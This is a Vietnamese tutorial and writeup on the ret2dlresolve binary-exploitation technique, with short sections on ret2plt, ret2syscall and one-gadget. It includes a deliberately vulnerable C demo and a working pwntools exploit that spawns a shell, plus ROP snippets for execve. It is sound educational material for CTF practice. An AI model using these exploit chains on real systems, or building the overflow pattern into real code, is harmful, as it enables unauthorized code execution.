# ret2dlresolve — gọi hàm libc KHÔNG cần leak

> Tài liệu học sâu. Writeup **verify ra shell** trên demo tự biên dịch (pwntools 4.15). Gồm luôn
> **ret2plt / ret2syscall / one-gadget** (các mục lẻ T3). Nguồn ở cuối.

---

## 1. ret2dlresolve giải quyết gì?

ret2libc cần **leak libc** trước. Nhưng nhiều bài **không có đường leak** (chỉ ghi được 1 lần,
không in gì). **ret2dlresolve** ép **lazy binding** của linker tự **resolve `system`** cho ta —
**không cần biết địa chỉ libc**.

> Nói ngắn: *giả mạo các cấu trúc mà `_dl_runtime_resolve` dùng (`Elf64_Sym`, `Elf64_Rela`,
> chuỗi tên hàm) để nó "resolve" ra `system` rồi gọi — khỏi leak.*

**Điều kiện:**
- **Lazy binding** (PLT resolve khi gọi lần đầu) → cần **Partial RELRO** hoặc **No RELRO** (Full
  RELRO resolve sẵn lúc load → KHÔNG dùng được).
- **No PIE** (thường) để địa chỉ `.dynamic`/bss cố định.
- Ghi được **một vùng dữ liệu** (bss) để đặt cấu trúc giả.

---

## 2. Cơ chế (vì sao lừa được)

Khi gọi `func@plt` lần đầu, PLT nhảy vào `_dl_runtime_resolve(link_map, reloc_index)`:
1. Lấy `Elf64_Rela` thứ `reloc_index` trong `.rela.plt` → nó trỏ tới một `Elf64_Sym`.
2. `Elf64_Sym` cho offset vào `.dynstr` → **tên hàm** (chuỗi).
3. Linker tìm tên đó trong libc → ghi địa chỉ thật vào GOT → gọi.

**Lỗ hổng:** `reloc_index` do **payload điều khiển** và không bị kiểm biên. Ta đặt `reloc_index`
chỉ tới một **`Rela` giả** (trong bss ta ghi) → trỏ **`Sym` giả** → trỏ chuỗi **`"system"`** ta
đặt → linker resolve `system` và gọi nó với tham số ta set (`"/bin/sh"`). Tự dựng 3 cấu trúc này
rất lắt léo → **`Ret2dlresolvePayload` của pwntools** gói hết.

---

## 3. Writeup (demo, verify ra shell)

```c
// dlres.c — gcc -no-pie -fno-stack-protector -z norelro dlres.c -o dlres   (No/Partial RELRO)
void gadgets(){ asm("pop %rdi; ret; pop %rsi; pop %r15; ret; pop %rdx; ret"); }
void vuln(){ char buf[0x20]; read(0, buf, 0x200); }   // KHÔNG leak, KHÔNG system
int main(){ vuln(); }
```
Không có `system`, **không leak** được. ret2dlresolve: nạp cấu trúc giả vào bss, rồi trigger resolve.

```python
#!/usr/bin/env python3
from pwn import *
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload

context.binary = exe = ELF("./dlres", checksec=False)
p = process(exe.path)

dl = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])  # tự dựng Sym/Rela/str giả

rop = ROP(exe)
rop.read(0, dl.data_addr, len(dl.payload))   # stage: nạp dl.payload vào data_addr (bss)
rop.ret2dlresolve(dl)                         # trigger _dl_runtime_resolve -> system("/bin/sh")

p.send(flat(b"A"*0x28, rop.chain()))          # offset = buf 0x20 + saved rbp 8
p.send(dl.payload)                            # read ở trên nuốt cái này vào bss
p.interactive()
```
**Log:** `data_addr = 0x403e00` → `$ id` → shell ✅.

**Mấu chốt:**
- `Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])` → `dl.payload` (các cấu trúc giả)
  + `dl.data_addr` (nơi đặt).
- `rop.read(0, dl.data_addr, ...)` **ghi `dl.payload` vào bss** (cần gadget set rdi/rsi/rdx — ở
  đây lấy từ `gadgets()`; thiếu thì dùng [ret2csu](ret2csu.md), lưu ý `edi` 32-bit).
- `rop.ret2dlresolve(dl)` nối phần **đẩy `reloc_index` + gọi** `_dl_runtime_resolve`.

> **Thiếu `pop rdi`/csu?** Bài local `ret2libc_stackpivot` (modern, không `__libc_csu_init`) phải
> dùng gadget lạ `mov edi, 0x404040 ; jmp rax` để set rdi = bss cố định rồi gọi `gets` — xem §6.

---

## 4. ret2plt — gọi hàm có sẵn qua PLT

Nếu binary **đã import** hàm bạn cần (vd `system`, `puts`), gọi thẳng **`exe.plt.system`** (không
cần libc base, vì PLT ở trong binary no-PIE):
```python
rop.call(exe.plt.system, [binsh_addr])     # nếu 'system' có trong PLT
rop.call("puts", [exe.got.puts])           # ret2plt để LEAK libc (in GOT)
```
Dạng bài ROP Emporium `split`/`callme`. Khác ret2libc: ret2plt **không cần leak** nếu hàm đích
sẵn trong PLT; nhưng hiếm khi có `system@plt` trực tiếp → thường chỉ dùng `puts@plt`/`write@plt`
để **leak** rồi chuyển ret2libc.

---

## 5. ret2syscall & one-gadget (gộp)

**ret2syscall** — binary **static** (không libc) hoặc muốn syscall trực tiếp: tự xếp
`execve("/bin/sh",0,0)` bằng gadget + `syscall`. Đã verify mẫu (execve) ở
[rop.md §ví dụ 2](pwntools/rop.md#ví-dụ-2--execvebinsh-qua-syscall-verify-ra-shell); bài local
[`BOF_ROPchain`](ret2libc.md#6-danh-sách-bài-tập--gợi-ý).
```python
rop(rax=59, rdi=binsh, rsi=0, rdx=0); rop.raw(rop.find_gadget(["syscall"]).address)
```

**one-gadget** — không phải kỹ thuật riêng, là **công cụ**: tìm 1 địa chỉ trong libc mà nhảy vào
là `execve("/bin/sh")` luôn (kèm ràng buộc). Dùng CHUNG với ret2libc sau khi có libc base:
```bash
one_gadget ./libc.so.6      # ra vài offset + ràng buộc (vd [rsp+0x40]==NULL)
```
```python
payload = flat(cyclic(off), libc.address + og)   # thay cho pop rdi;binsh;system nếu ràng buộc thoả
```

---

## 6. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **demo §3** | ⭐⭐ | ret2dlresolve chuẩn | verify ra shell |
| **ir0nstone ret2dlresolve** | ⭐⭐ | lý thuyết + bài tập | <https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve> |
| **`ret2libc_stackpivot`** (local) | ⭐⭐⭐⭐ | dlresolve khi **không csu/pop rdi** | gadget `mov edi,0x404040; jmp rax` set rdi=bss rồi `gets`; ghép stack pivot |
| **ROP Emporium `ret2csu`/`pivot`** | ⭐⭐⭐ | ret2plt/pivot đối chiếu | <https://ropemporium.com/> |
| **pwnable.tw static** | ⭐⭐⭐ | ret2syscall | binary static, dựng execve syscall |

**Lộ trình:** ret2plt (gọi PLT/leak) → ret2syscall (static execve) → one-gadget (rút gọn ret2libc)
→ ret2dlresolve (demo) → ret2dlresolve không-csu (ret2libc_stackpivot, ghép pivot).

---

## Nguồn tham khảo

- ir0nstone — *ret2dlresolve*: <https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve>
- pwntools `Ret2dlresolvePayload`: <https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html>
- ROP Emporium (ret2plt/pivot/csu): <https://ropemporium.com/> · one_gadget: <https://github.com/david942j/one_gadget>
- API: [rop.md](pwntools/rop.md#ret2dlresolve), [ret2csu.md](ret2csu.md), [ret2libc.md](ret2libc.md)
